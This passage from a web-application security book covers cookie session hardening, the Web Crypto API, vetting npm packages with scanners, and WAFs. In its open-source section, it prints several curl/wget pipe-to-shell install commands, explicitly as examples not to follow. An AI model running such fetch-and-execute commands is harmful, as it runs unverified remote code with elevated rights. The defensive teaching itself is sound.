<p>MembershipReboot supports adding secret questions and answers along with the ability to update user account details. Details on how this can be done is in the <a href="https://github.com/brockallen/BrockAllen.MembershipReboot/tree/master/samples">sample code</a> kindly provided by Brock Allen and documentation on their <a href="https://github.com/brockallen/BrockAllen.MembershipReboot/wiki#features">github wiki</a>.</p>

<h5 id="web-applications-countermeasures-lack-of-authentication-authorisation-session-management-securing-sessions">Securing Sessions</h5>

<p>In the above example we (were constrained by a business requirement) chose to use cookies to carry the access token. Alternatively the access token could be transported within the end users HTTP response and request bodies and stored in local storage.</p>

<p>Using local storage means there is less to be concerned about in terms of protecting the token than with using cookies. LocalStorag is only concerned with XSS, where as cookies are susceptible to both CSRF and XSS attacks (although XSS to a lesser degree). If you decided to use local storage, You’re anti XSS strategy needs to be water-tight.<br />
Even with the <code>HttpOnly</code> flag set on your cookie, it is possible to compromise the cookie contents if the values of the <code>Domain</code> and/or <code>Path</code> cookie attributes are too permissive. For example if you have the <code>Domain</code> value set to <code>.localtest.me</code>, an attacker can attempt to launch attacks on the cookie token between other hosts with the same domain name. Some of these hosts may contain vulnerabilities, thus increasing the attack surface.</p>


<img src="images/SecuringSessions.png" alt="Securing Sessions"/>


<p>Set the <a href="https://www.owasp.org/index.php/Session_Management_Cheat_Sheet#Secure_Attribute"><code>Secure</code> attribute</a> on the cookie. This instructs web browsers to only send the cookie over a TLS (HTTPS) connection, thus removing this MItM attack vector.<br />
You can and should test this by inspecting the headers with an HTTP intercepting proxy. While you’re at it, you may as well add this as a test to your Zap Regression Test suite as discussed in the Process and Practises chapter of <a href="https://leanpub.com/holistic-infosec-for-web-developers">Fascicle 0</a>.</p>

<p>Turn the <code>HttpOnly</code> cookie flag on. This instructs web browser to not allow access to the cookie via JavaScript. The <code>Secure</code> flag must also be enabled as mentioned above, in order to mitigate Session Id theft.</p>

<p>CSRF is the most common attack used to leverage cookies containing authentication details. In order to mitigate this attack vector, the use of the synchroniser token pattern is recommended. Each server side technology will implement this type of protection differently. CSRF is discussed in more depth in the Cross-Site Request Forgery (CSRF) sections.</p>

<p>As for the <code>Expires</code> and <code>Max-Age</code> cookie attributes from<br />
<code>client\ServiceLayer\APIControllers\SecureController.cs</code> (seen above), these will need to be set to the maximum values that the business is prepared to accept along with the <code>Client.AccessTokenLifetime</code> from <code>backend\Auth\AuthService.WebApi\IdSvr\Clients.cs</code> (seen above) (which need to line up) for the IdentityServer.</p>

<p>The OWASP <a href="https://www.owasp.org/index.php/Session_Management_Cheat_Sheet#Cookies">Session Management Cheat Sheet</a> has more details around securing cookies.</p>

<h4 id="web-applications-countermeasures-cryptography-on-the-client">Cryptography on the Client (AKA Untrusted Crypto)</h4>


<img class="threat-tags" src="images/ThreatTags----PreventionDIFFICULT.png"/>


<p>There are fundamental principles that we need to examine, understand and embrace before we dive into some details.</p>

<p>The attackers will always target the easiest to compromise point of any given encryption protocol.</p>

<p>Cryptography is one small ingredient that may go into creating a system that is aiming to be secure to a degree. Usually it’s just easier to step around or by-pass any crypto. So think of crypto as one defence. Unless all of your other areas of security are better than your crypto solutions, then an attacker will more than likely be targeting the other weaker areas.</p>

<h5 id="web-applications-countermeasures-cryptography-on-the-client-web-cryptography-api">
  <a href="https://developer.mozilla.org/en-US/docs/Web/API/Web_Crypto_API">Web Cryptography API</a>
</h5>

<p>Has been implemented across browser vendors now.</p>

<p>
  <a href="http://caniuse.com/cryptography">
    <img src="images/WebCryptoApi.png" alt="Web Crypto Api"/>
  </a>
</p>

<blockquote>
  <p>Above image from <a href="http://caniuse.com/cryptography">http://caniuse.com/cryptography</a><br />
Licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC by 4.0</a><br />
Removed part of the unsupported versions for Firefox, Chrome and Opera.</p>
</blockquote>

<p>For those browsers still not playing ball, you can use a polyfill, Although those are dropping off due to all good browsers now supporting the Web Crypto API. Plus the whole point of the Web Crypto API was to remove JavaScript crypto, so that the underlying key(s) are not accessible to JavaScript.</p>

<p>The browser is insecure and should never be trusted. HTML5 has added a lot of extra attack surface without adding much in the way of security.</p>

<p>From the <a href="https://dvcs.w3.org/hg/webcrypto-api/raw-file/tip/spec/Overview.html">W3C Web Cryptography API</a><br />
“<em>The Web Crypto API defines a low-level interface to interacting with cryptographic key material that is managed or exposed by user agents.</em>” but not exposed to the JavaScript application environment.</p>

<p>For starters:</p>

<ul>
  <li>The user is untrusted, therefore their agent is untrusted</li>
  <li>The key is the only thing that needs to be, and should be secret and trustworthy. Everything else should be public</li>
  <li>If the key is managed by something that is untrusted (from the servers perspective), then the Web Crypto API is untrusted (from the servers perspective). Therefore crypto in the browser can not be trusted by the server, that is, if the server needs to trust it. </li>
</ul>

<p>The usual perspective in client/server relationships is that the server holds the single source of truth (the key). Where crypto in the browser comes into the picture is that the client holds the single source of truth. If the key is accessible to the JavaScript application environment, which it is if you are using your own JavaScript crypto or someone else’s crypto libraries, then we’re on very shaky ground. If however we can hide this key away from the JavaScript application environment and have the browser expose an API, then we have a little more privacy.  </p>

<p>Relying on the Web Cryptography API as opposed to using low-level primitives provides a slightly better and more secure starting point. Why it’s only slightly better is discussed in the <a href="chap06.html#web-applications-risks-that-solution-causes-cryptography-on-the-client">Risks that Solution Causes</a> section.</p>

<p>In order, from the lower level to higher level, the following Web Crypto API concepts need to be understood:</p>

<h5 id="leanpub-auto-user-agent">user agent</h5>

<p>“<em>The specification assumes, but does not require, that conforming user agents do not and will not be directly implementing cryptographic operations within the user agent itself</em>” Often user agents will defer cryptographic operations to existing APIs available as part of the underlying operating system or to third-party modules not directly managed by the user agent. As you can see, the responsibility doesn’t belong to the server, but rather to the client or more specifically the end user.</p>

<h5 id="leanpub-auto-handle">
  <code>[[handle]]</code>
</h5>

<p>Internal slots and methods in the ECMA-262 (3, 5 and 6) standards are usually represented within “<code>[[</code>”, “<code>]]</code>” in the ECMA-262 specifications. Internal slots and methods are pseudo-properties/pseudo-methods that the specification uses to define required state (for internal slots), behaviour (for internal methods). Internal slots and methods are hidden from user code, never exposed to applications. They may or may not correspond to properties of objects used by the engine and/or exposed via the implementation of the public API. The internal slot named <code>[[handle]]</code>, just as all other internal slots and methods, represents an opaque, implementation specific type. The <code>[[handle]]</code> slot contains whatever data the underlying cryptographic implementation uses to represent a logical key. So in theory, the key material is never exposed to the JavaScript application environment, but rather via a user agent which manages or exposes to the internal <code>[[handle]]</code> slot.</p>

<h5 id="leanpub-auto-cryptokey-web-api-interface">
<code>CryptoKey</code> (Web API interface)</h5>

<p>“<em>The CryptoKey object represents an opaque reference to keying material that is managed by the user agent</em>”  
“<em>All CryptoKey objects have internal slots named [[type]], [[extractable]], [[algorithm]], [[algorithm_cached]], [[usages]], [[usages_cached]], and [[handle]].</em>” The CryptoKey object represents the bridge between the JavaScript execution environment and the underlying libraries, through the use of the internal slot named <code>[[handle]]</code></p>

<p>A <code>CryptoKey</code> object can be obtained by using <code>SubtleCrypto.generateKey()</code>, <code>SubtleCrypto.deriveKey()</code> or <code>SubtleCrypto.importKey()</code>. See below for details on <code>SubtleCrypto</code></p>

<p>Check the <a href="https://dvcs.w3.org/hg/webcrypto-api/raw-file/tip/spec/Overview.html#cryptokey-interface">specification</a> for further details.</p>

<p> </p>

<h5 id="leanpub-auto-the-other-two-web-crypto-api-interfaces">The other two Web Crypto API interfaces</h5>

<h6 id="leanpub-auto-cryptohttpsdevelopermozillaorgen-usdocswebapicrypto-web-api-interface">
<a href="https://developer.mozilla.org/en-US/docs/Web/API/Crypto"><code>Crypto</code></a> (Web API interface)</h6>

<p>The <code>Crypto</code> interface was implemented in some browsers without it being well defined or cryptographically sound. Browsers implementing the Web Crypto API have removed the <code>Crypto</code> methods and properties other than <code>Crypto.subtle</code> which provides access to the below <code>SubtleCrypto</code> interface, which provides all of the Web Crypto API methods.</p>

<p>Check the <a href="https://dvcs.w3.org/hg/webcrypto-api/raw-file/tip/spec/Overview.html#crypto-interface">specification</a> for further details.</p>

<h6 id="leanpub-auto-subtlecryptohttpsdevelopermozillaorgen-usdocswebapisubtlecrypto-web-api-interface">
<a href="https://developer.mozilla.org/en-US/docs/Web/API/SubtleCrypto"><code>SubtleCrypto</code></a> (Web API interface)</h6>

<p><code>SubtleCrypto</code> provides all the methods to work with the Web Crypto API.</p>

<p>Check the <a href="https://dvcs.w3.org/hg/webcrypto-api/raw-file/tip/spec/Overview.html#subtlecrypto-interface">specification</a> for further details.</p>

<p> </p>

<p>Cryptography on the client does have its place. Use it in its designated place and in accordance with the standard. We know the server should never trust the client, but if the application is entirely on the client with no server needing to afford trust to the client, and the client doesn’t want to trust the server, then it may be an option worth considering. If you consider how it may be abused at every point along the way, options do start to drop off quickly though. The following are some options that may suite the Web Crypto API:</p>

<h5 id="leanpub-auto-cloud-storage">Cloud Storage</h5>

<p>Is one use case. In this scenario, the server doesn’t need to trust the client. It receives data from the client, stores it and returns it. The user is exchanging their data with themselves in the future. So long as the server never attempts to parse or execute it and the only browser that it may end up in is from the client that sent it to start with. The client is responsible for the key. The data is usually encrypted on the client, sent to the server encrypted, then fetched back to the client and then finally decrypted again with the key that the client is responsible for.</p>

<h5 id="leanpub-auto-protected-data-and-document-exchange">Protected Data and Document Exchange</h5>

<p>which uses a similar concept as the cloud storage, but the data doesn’t necessarily have to ever touch the server. A couple of offerings that come to mind are:</p>

<ol class="numeric">
  <li>Chris Campbells <a href="https://deaddrop.jadeworld.com/">DeadDrop</a> which has been lovingly crafted and offered free of charge.</li>
  <li>
<a href="https://tresorit.com">Tresorit</a> which has a large price tag.</li>
</ol>

<p> </p>

<p>Basically client centric applications.</p>

<p>My preference is still to prefer any crypto to be performed on the server where you have more control, less attack surface and greater visibility.</p>

<h4 id="web-applications-countermeasures-consuming-free-and-open-source">Consuming Free and Open Source</h4>

<img class="threat-tags" src="images/ThreatTags----PreventionEASY.png"/>


<h5 id="leanpub-auto-process">Process</h5>

<p>Dibbe Edwards <a href="https://soundcloud.com/owasp-podcast/dibbe-edwards-devops-and-open-source-at-ibm">discusses</a> some excellent initiatives on how they do it at IBM. I will attempt to paraphrase some of them here:</p>

<ul>
  <li>Implement process and governance around which open source libraries you can use</li>
  <li>Legal review: checking licenses</li>
  <li>Scanning the code for vulnerabilities, manual and automated code review</li>
  <li>Maintain a list containing all the libraries that have been approved for use.<br />
If not on the list, make request and it should go through the same process.</li>
  <li>Once the libraries are in your product they should become as part of your own code so that they get the same rigour over them as any of your other code written in-house</li>
  <li>There needs to be automated process that runs over the code base to check that nothing that is not on the approved list is included</li>
  <li>Consider automating some of the suggested tooling options below</li>
</ul>

<p>There is an excellent paper by the SANS Institute on <a href="http://www.sans.org/reading-room/whitepapers/awareness/security-concerns-open-source-software-enterprise-requirements-1305">Security Concerns in Using Open Source Software
for Enterprise Requirements</a> that is well worth a read. It confirms what the likes of IBM are doing in regards to their consumption of free and open source libraries.</p>

<h5 id="leanpub-auto-consumption-is-your-responsibility">Consumption is Your Responsibility</h5>

<p>As a developer, you are responsible for what you install and consume. <a href="https://github.com/joaojeronimo/rimrafall">Malicious NodeJS packages</a> do end up on NPM from time to time. The same goes for any source or binary you download and run. The following commands are often encountered as being “the way” to install things:</p>

<figure class="code">
  <figcaption>wget</figcaption>

<div class="highlight"><pre><code></code># Fetching install.sh and running immediately in your shell.
# Do not do this. Download first -&gt; Check and verify good -&gt; run if good.
sh -c "$(wget https://raw.github.com/account/repo/install.sh -O -)"
</pre></div>

</figure>

<figure class="code">
  <figcaption>curl</figcaption>

<div class="highlight"><pre><code></code># Fetching install.sh and running immediately in your shell.
# Do not do this. Download first -&gt; Check and verify good -&gt; run if good.
sh -c "$(curl -fsSL https://raw.github.com/account/repo/install.sh)"
</pre></div>

</figure>

<p>Below is the <a href="https://github.com/nodesource/distributions">official way</a> to install NodeJS. Do not do this. <code>wget</code> or <code>curl</code> first, then make sure what you have just downloaded is not malicious.</p>

<aside>

  <p>Inspect the code before you run it.</p>


</aside>

<ol class="numeric">
  <li>The repository could have been tampered with</li>
  <li>The transmission from the repository to you could have been intercepted and modified.</li>
</ol>

<figure class="code">
  <figcaption>curl</figcaption>

<div class="highlight"><pre><code></code># Fetching install.sh and running immediately in your shell.
# Do not do this. Download first -&gt; Check and verify good -&gt; run if good.
curl -sL https://deb.nodesource.com/setup_4.x | sudo -E bash -
sudo apt-get install -y nodejs
</pre></div>

</figure>

<h5 id="leanpub-auto-keeping-safe">Keeping Safe</h5>

<h6 id="leanpub-auto-wget-curl-etc">wget, curl, etc</h6>

<p>Please do not <code>wget</code>, <code>curl</code> or fetch in any way and pipe what you think is an installer or any script to your shell without first verifying that what you are about to run is not malicious. Do not download and run in the same command.</p>

<p>The better option is to:</p>

<ol class="numeric">
  <li>Verify the source that you are about to download, if all good</li>
  <li>Download it</li>
  <li>Check it again, if all good</li>
  <li>Only then should you run it</li>
</ol>

<h6 id="leanpub-auto-npm-install">npm install</h6>

<p>As part of an <code>npm install</code>, package creators, maintainers (or even a malicious entity intercepting and modifying your request on the <a href="#network-identify-risks-wire-inspecting">wire</a>) can define scripts to be run on specific <a href="https://docs.npmjs.com/misc/scripts">NPM hooks</a>. You can check to see if any package has hooks (before installation) that will run scripts by issuing the following command:<br />
<code>npm show [module-you-want-to-install] scripts</code></p>

<p>Recommended procedure:</p>

<ol class="numeric">
  <li>Verify the source that you are about to download, if all good</li>
  <li><code>npm show [module-you-want-to-install] scripts</code></li>
  <li>Download the module without installing it and inspect it. You can download it from <code>http://registry.npmjs.org/[module-you-want-to-install]/-/[module-you-want-to-install]-VERSION.tgz</code>
</li>
</ol>

<p>The most important step here is downloading and inspecting before you run.</p>

<h6 id="web-applications-countermeasures-consuming-free-and-open-source-keeping-safe-doppelganger-packages">Doppelganger Packages</h6>

<p>Similarly to <a href="chap04.html#network-identify-risks-doppelganger-domains">Doppelganger Domains</a>, People often miss-type what they want to install. If you were someone that wanted to do something malicious like have consumers of your package destroy or modify their systems, send sensitive information to you, or any number of other malicious activities (ideally identified in the <a href="chap06.html#web-applications-identify-risks-consuming-free-and-open-source">Identify Risks</a> section. If not already, add), doppelganger packages are an excellent avenue for raising the likelihood that someone will install your malicious package by miss typing the name of it with the name of another package that has a very similar name. I covered this in my <a href="https://speakerdeck.com/binarymist/0wn1ng-the-web-at-www-dot-wdcnz-dot-com">“0wn1ng The Web”</a> presentation, with demos.</p>

<p>Make sure you are typing the correct package name. Copy -&gt; Pasting works.</p>

<h6 id="leanpub-auto-whitelisting-packageshttpsnpmenpmjscomdocsworkflowwhitelistinghtml-via-npm-enterprise">
<a href="https://npme.npmjs.com/docs/workflow/whitelisting.html">Whitelisting Packages</a> via npm Enterprise</h6>

<p>Reviewing and deciding as an organisation which packages you allow your developers to consume is another good safety measure. Yes it means someone has to do the reviewing, but partly relying on the vetting that the tooling and other options discussed in this section can make this process quicker. Then via the Enterprise admin console, set <code>Read through cache</code> to <code>Off</code> so that only whitelisted packages can be fetched.</p>

<p>Whitelisted packages are those that are added to the Enterprise instance with:<br />
<code>npme add-package &lt;packagename&gt;</code></p>

<h5 id="web-applications-countermeasures-consuming-free-and-open-source-tooling">Tooling</h5>

<p>For <strong>NodeJS developers</strong>: Keep your eye on the <a href="https://nodesecurity.io/advisories">nodesecurity advisories</a>. Identified security issues can be posted to <a href="https://nodesecurity.io/report">NodeSecurity report</a>.</p>

<p>Tooling for JavaScript package security defects is moving quickly, so although the below was correct at the time of writing, things may have progressed further.</p>

<h6 id="leanpub-auto-npm-outdatedhttpsdocsnpmjscomclioutdated">
  <a href="https://docs.npmjs.com/cli/outdated">npm-outdated</a>
</h6>

<p>Simply checking the NPM registry to see if any of your installed or specific packages are currently out of date.</p>

<p>Running the following command in your application directory:<br />
<code>npm outdated</code><br />
May produce output like the following:</p>

<figure class="code">
  <figcaption>npm-outdated</figcaption>

<div class="highlight"><pre><code></code>Package               Current  Wanted  Latest  Location
body-parser            1.13.3  1.15.2  1.15.2  body-parser
config                 1.15.0  1.21.0  1.21.0  config
errorhandler            1.4.2   1.4.3   1.4.3  errorhandler
express                4.13.3  4.14.0  4.14.0  express
express-form           0.12.4  0.12.6  0.12.6  express-form
jade                   0.30.0  0.30.0  1.11.0  jade
less-middleware        0.1.11  0.1.11   2.1.0  less-middleware
method-override         2.3.5   2.3.6   2.3.6  method-override
morgan                  1.6.1   1.7.0   1.7.0  morgan
nodemailer              1.4.0  1.11.0   2.4.2  nodemailer
winston                 1.0.1   1.1.2   2.2.0  winston
winston-email          0.0.10  0.0.10  0.0.11  winston-email
winston-syslog-posix    0.1.5   0.1.5   1.1.0  winston-syslog
</pre></div>

</figure>

<ul>
  <li>
<code>Wanted</code> is the maximum version of the package that satisfies the semver range specified in <code>package.json</code>
</li>
  <li>
<code>latest</code> is the version of the package tagged as latest in the registry.</li>
</ul>

<h6 id="leanpub-auto-npm-checkhttpswwwnpmjscompackagenpm-check">
  <a href="https://www.npmjs.com/package/npm-check">npm-check</a>
</h6>

<p>Is a similar tool to npm-outdated, but provides more information and an API useful for using in a CI tool-chain. npm-check can also inform you of missing or packages that are not currently being used.</p>

<h6 id="leanpub-auto-davidhttpsdavid-dmorg">
  <a href="https://david-dm.org/">David</a>
</h6>

<p>Uses your <code>package.json</code> file in your NodeJS project to check whether your dependencies are up to date and no known vulnerabilities are found. You embed a badge on your Github page giving immediate feedback, which links to a page with details of any issues for your dependencies.</p>

<h6 id="leanpub-auto-retirejshttpsgithubcomretirejsretirejs">
  <a href="https://github.com/RetireJS/retire.js">RetireJS</a>
</h6>

<p>Is useful to help you find JavaScript libraries with known vulnerabilities.<br />
RetireJS has the following:</p>

<ol class="numeric">
  <li>Command line scanner
    <ul>
      <li>Excellent for CI builds. Include it in one of your build definitions and let it do the work for you.
        <ul>
          <li>To install globally:<br />
<code>npm i -g retire</code>
</li>
          <li>To run it over your project:<br />
<code>retire my-project</code><br />
Results like the following may be generated:
            <figure class="code">
<div class="highlight"><pre><code></code>public/plugins/jquery/jquery-1.4.4.min.js
↳ jquery 1.4.4.min has known vulnerabilities:
http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2011-4969
http://research.insecurelabs.org/jquery/test/
http://bugs.jquery.com/ticket/11290
</pre></div>

            </figure>
          </li>
        </ul>
      </li>
      <li>To install RetireJS locally to your project and run as a git <code>precommit-hook</code>.<br />
 There is an NPM package that can help us with this, called <code>precommit-hook</code>, which installs the git <code>pre-commit</code> hook into the usual <code>.git/hooks/pre-commit</code> file of your projects repository. This will allow us to run any scripts immediately before a commit is issued.<br />
 Install both packages locally and save to <code>devDependencies</code> of your <code>package.json</code>. This will make sure that when other team members fetch your code, the same <code>retire</code> script will be run on their <code>pre-commit</code> action.
        <figure class="code">
<div class="highlight"><pre><code></code>npm install precommit-hook --save-dev
npm install retire --save-dev
</pre></div>

        </figure>

        <p>If you do not configure the hook via the <code>package.json</code> to run specific scripts, it will run <code>lint</code>, <code>validate</code> and <code>test</code> by default. See the RetireJS documentation for options.</p>

        <figure class="code">
<div class="highlight"><pre><code></code><code class="p">{</code>
   <code class="s2">"name"</code><code class="o">:</code> <code class="s2">"my-project"</code><code class="p">,</code>
   <code class="s2">"description"</code><code class="o">:</code> <code class="s2">"my project does wiz bang"</code><code class="p">,</code>
   <code class="s2">"devDependencies"</code><code class="o">:</code> <code class="p">{</code>
      <code class="s2">"retire"</code><code class="o">:</code> <code class="s2">"~0.3.2"</code><code class="p">,</code>
      <code class="s2">"precommit-hook"</code><code class="o">:</code> <code class="s2">"~1.0.7"</code>
   <code class="p">},</code>
   <code class="s2">"scripts"</code><code class="o">:</code> <code class="p">{</code>
      <code class="s2">"validate"</code><code class="o">:</code> <code class="s2">"retire -n -j"</code><code class="p">,</code>
      <code class="s2">"test"</code><code class="o">:</code> <code class="s2">"a-test-script"</code><code class="p">,</code>
      <code class="s2">"lint"</code><code class="o">:</code> <code class="s2">"jshint --with --different-options"</code>
   <code class="p">}</code>
<code class="p">}</code>
</pre></div>

        </figure>

        <p>Adding the <code>pre-commit</code> property allows you to specify which scripts you want run before a successful commit is performed. The following <code>package.json</code> defines that the <code>lint</code> and <code>validate</code> scripts will be run. <code>validate</code> runs our <code>retire</code> command.</p>

        <figure class="code">
<div class="highlight"><pre><code></code><code class="p">{</code>
   <code class="s2">"name"</code><code class="o">:</code> <code class="s2">"my-project"</code><code class="p">,</code>
   <code class="s2">"description"</code><code class="o">:</code> <code class="s2">"my project does wiz bang"</code><code class="p">,</code>
   <code class="s2">"devDependencies"</code><code class="o">:</code> <code class="p">{</code>
      <code class="s2">"retire"</code><code class="o">:</code> <code class="s2">"~0.3.2"</code><code class="p">,</code>
      <code class="s2">"precommit-hook"</code><code class="o">:</code> <code class="s2">"~1.0.7"</code>
   <code class="p">},</code>
   <code class="s2">"scripts"</code><code class="o">:</code> <code class="p">{</code>
      <code class="s2">"validate"</code><code class="o">:</code> <code class="s2">"retire -n -j"</code><code class="p">,</code>
      <code class="s2">"test"</code><code class="o">:</code> <code class="s2">"a-test-script"</code><code class="p">,</code>
      <code class="s2">"lint"</code><code class="o">:</code> <code class="s2">"jshint --with --different-options"</code>
   <code class="p">},</code>
   <code class="s2">"pre-commit"</code><code class="o">:</code> <code class="p">[</code><code class="s2">"lint"</code><code class="p">,</code> <code class="s2">"validate"</code><code class="p">]</code>
<code class="p">}</code>
</pre></div>

        </figure>

        <p>Keep in mind that <code>pre-commit</code> hooks can be very useful for all sorts of checking of things immediately before your code is committed. For example running <a href="https://github.com/binarymist/NodeGoat/wiki/Security-Regression-Testing-with-Zap-API">security regression tests</a> mentioned previously in <a href="https://leanpub.com/holistic-infosec-for-web-developers">Fascicle 0</a> with the OWASP ZAP API, as demonstrated here: <a href="https://youtu.be/DrwXUOJWMoo">https://youtu.be/DrwXUOJWMoo</a>.</p>
      </li>
    </ul>
  </li>
  <li>Chrome extension</li>
  <li>Firefox extension</li>
  <li>Grunt plugin</li>
  <li>Gulp task</li>
  <li>Burp and OWASP ZAP plugin</li>
  <li>
<a href="http://retire.insecurity.today/">On-line tool</a> you can simply enter your web applications URL and the resource will be analysed</li>
</ol>

<h6 id="leanpub-auto-requiresafe">requireSafe</h6>

<p>provides “<em>intentful auditing as a stream of intel for bithound</em>”. Last time I spoke with <a href="https://twitter.com/adam_baldwin">Adam Baldwin</a> this project was moving slowly. From all the redirects going on, it appears to be now soaked up into Node Security Platform (NSP).</p>

<h6 id="leanpub-auto-bithoundhttpswwwbithoundio">
  <a href="https://www.bithound.io/">bithound</a>
</h6>

<p>According to the Bithound Github, there doesn’t appear to be much activity on this project currently, which may make sense as requireSafe appears to have been moved to NSP.</p>

<p>In regards to NPM packages, we know the following things:</p>

<ol class="numeric">
  <li>We know about a small collection of vulnerable NPM packages. Some of which have high fan-in (many packages depend on them).</li>
  <li>The vulnerable packages have published patched versions</li>
  <li>Many packages are still consuming the vulnerable unpatched versions of the packages that have published patched versions
    <ul>
      <li>So although we could have removed a much larger number of vulnerable packages due to their persistence on depending on unpatched packages, we have not. I think this mostly comes down to lack of visibility, awareness and education. This is exactly what I’m trying to change.</li>
    </ul>
  </li>
</ol>

<p>bithound supports:</p>

<ul>
  <li>JavaScript, TypeScript and JSX (back-end and front-end)</li>
  <li>In terms of version control systems, only git is supported</li>
  <li>Opening of bitbucket and github issues</li>
  <li>Providing statistics on code quality, maintainability and stability. I queried Adam on this, but not a lot of information was forth coming.</li>
</ul>

<p>bithound can be configured to not analyse some files. Very large repositories are prevented from being analysed due to large scale performance issues.</p>

<p>Analyses both NPM and Bower dependencies and notifies you if any are:</p>

<ul>
  <li>Out of date</li>
  <li>Insecure. Assuming this is based on the known vulnerabilities (41 node advisories at the time of writing this)</li>
  <li>Unused</li>
</ul>

<p>Analysis of opensource projects are free.</p>

<h6 id="leanpub-auto-node-security-platformhttpsnodesecurityio-nsp">
<a href="https://nodesecurity.io/">Node Security Platform</a> (NSP)</h6>

<p>NSP at the time of writing is quite popular. It provides Github pull request integration, Has a Code Climate Node Security Engine. Code Climate was discussed briefly in the “Linting, Static Analysis” section of “Code Review” in the Process and Practises chapter of <a href="https://leanpub.com/holistic-infosec-for-web-developers">Fascicle 0</a>. Also has a CLI, so is CI friendly.</p>

<p>You can install the NSP CLI like:<br />
<code>npm install -g nsp</code><br />
To find out what nsp gives you:<br />
<code>nsp --help</code><br />
To run a check, cd into your application directory and:<br />
<code>nsp check</code><br />
Any known vulnerabilities present will be printed.</p>

<p>There is also a:</p>

<ol class="numeric">
  <li>gulp plugin (<code>gulp-nsp</code>) which you can use to check all dependencies listed in your <code>package.json</code> or <code>shrinkwrap.json</code>.</li>
  <li>Visual Studio Code plugin that will run the NSP audit from within the editor. To install, open a command prompt with <code>Ctrl+Shift+C</code> and run the following command:<br />
<code>ext install vscode-nsp</code>
</li>
</ol>

<h6 id="leanpub-auto-snykhttpssnykio">
  <a href="https://snyk.io">Snyk</a>
</h6>

<p>Has a fairly similar feature set to NSP, plus more, like:</p>

<ul>
  <li>Email notifications for new vulnerabilities and fixes</li>
  <li>Customisation of the severity level at which the tests should fail</li>
  <li>Automatically create Github pull requests to fix the vulnerability</li>
  <li>Snyk for <a href="https://snyk.io/serverless">Serverless</a>
</li>
</ul>

<p>The pricing model seems a little dearer for non open source projects than NSP.</p>


<p> </p>

<p>You could of course just list all of your projects and global packages and check that there are none in the <a href="https://nodesecurity.io/advisories">advisories</a>, but this would be more work and who is going to remember to do that all the time?</p>

<p> </p>

<p>For <strong>.Net developers</strong>, there is the likes of <a href="https://github.com/OWASP/SafeNuGet">OWASP <strong>SafeNuGet</strong></a>.<br />
OWASP <a href="https://www.owasp.org/index.php/OWASP_Dependency_Check">DependencyCheck</a> also notifies of known, publicly disclosed vulnerabilities in Java and .Net, with experimental support for Ruby, Node.js and Python. I haven’t used DependencyCheck, it produces <a href="https://jeremylong.github.io/DependencyCheck/">false positives and false negatives</a>.</p>

<h4 id="web-applications-countermeasures-insufficient-attack-protection">Insufficient Attack Protection</h4>

<img class="threat-tags" src="images/ThreatTags----PreventionEASY.png"/>


<p><a href="https://www.owasp.org/index.php/Top_10_2013-A4-Insecure_Direct_Object_References">Insecure Direct Object References</a> was part of the OWASP Top 10 in 2013, which in 2017 was <a href="https://www.owasp.org/index.php/Top_10_2017-Release_Notes">merged</a> into <a href="https://www.owasp.org/index.php/Top_10_2017-A7-Insufficient_Attack_Protection">Insufficient Attack Protection</a>. OWASP has good guidance on this.</p>

<h5 id="web-applications-countermeasures-insufficient-attack-protection-waf">Web Application Firewall (WAF)</h5>

<p><a href="http://blog.binarymist.net/2014/12/27/installation-hardening-of-debian-web-server/#wafs">WAFs</a> are similar to Intrusion Prevention Systems (IPS) except they operate at the <a href="http://en.wikipedia.org/wiki/Application_layer">Application Layer</a>(HTTP), Layer 7 of the <a href="http://en.wikipedia.org/wiki/OSI_model">OSI model</a>. So they understand the concerns of your web application at a technical level. WAFs protect your application against a large number of attacks, like XSS, CSRF, SQLi, <a href="https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion">Local File Inclusion (LFI)</a>, session hijacking, invalid requests (requests to things that do not exist (think 404)). WAFs sit in-line between a gateway and the web application. They run as a proxy. Either on the physical web server or on another network node, but only the traffic directed to the web application is inspected, where as an IDS/IPS inspects all network traffic passed through its interfaces. WAFs use signatures that look like specific vulnerabilities to compare the network traffic targeting the web application and apply the associated rule(s) when matches are detected. Although not only limited to dealing with known signatures, some WAFs can detect and prevent attacks they have not seen before like responses containing larger than specified payloads. The source code of the web application does not have to be modified.</p>

<ol class="numeric">
  <li>
<a href="https://www.npmjs.com/package/fusker">Fusker</a>. Not sure if this is still actively maintained. At this point, there has not been any recent commits since 2012, but it does look like the best offering we have at this stage for NodeJS. So if your looking to help a security project out…</li>
  <li>
<a href="https://www.npmjs.com/package/express-waf">express-waf</a> was last commited to in 2015, there was only a single developer working on it when I checked</li>
  <li>Many cloud providers also have offerings, such as <a href="https://aws.amazon.com/waf/">AWS WAF</a>, which can provide some assistance in mitigating generic injection, XSS, DoS type attacks. Also providing an API useful for the automation, creation and deployment of web security rules</li>
</ol>

<h5 id="leanpub-auto-application-intrusion-detection-and-response">Application Intrusion Detection and Response</h5>

<p>You can think of this as taking a WAF one step closer to your application. In fact integrating it with your application. Augmenting your application with logic to detect and respond to threats.</p>

<p><a href="http://appsensor.org/">AppSensor</a> brings detection -&gt; prevention to your domain level. Most applications today just take attacks &amp; fall over. I have heard so many times we want our applications to fail securely when they get bad input. We do not want our applications being bullied and failing securely.
We want them to not fail at all in production, but rather defend themselves.</p>

<p>Technically AppSensor is not a WAF because the concepts are used to shape your application logic.</p>

<p>The project defines a conceptual framework and methodology that offers prescriptive guidance to implement intrusion detection and automated response into your applications. Providing attack awareness baked in, with real-time defences.</p>

<p>AppSensor provides &gt; 50 (signature based) detection points. Provides guidance on how to respond once an attack is identified. Possible actions include:</p>

<ul>
  <li>logging out the user</li>
  <li>locking the account or notifying an administrator</li>
  <li>more than a dozen response actions are described.</li>
</ul>

<p>At the time of writing the sample code is only in Java. The documentation is well worth checking out though. Resources in <a href="">Additional Resources</a> chapter.</p>

<h5 id="leanpub-auto-active-automated-prevention">Active Automated Prevention</h5>

<p>The application should recognise unusual requests. Automated scanning should be distinguishable from normal traffic.</p>

<p>By creating custom behaviour that responds to specific out of the ordinary requests with misleading feedback and/or behaviour that builds the attackers confidence and ultimately wastes their time, you as the application administrator can have the upper hand when it comes to actively defending against your attackers.</p>

<p>By spending the attackers budget for them, you are ultimately depleting their resources, which will cause them to make silly mistakes and be caught and/or just run out of time.</p>

<h3 id="web-applications-risks-that-solution-causes">4. SSM Risks that Solution Causes</h3>

<p>Often with increased security comes increased confidence. Increased confidence is a weakness in itself, along with the fact that it brings with it other vulnerabilities. The more you know, the more you should be aware of how vulnerable you are.</p>

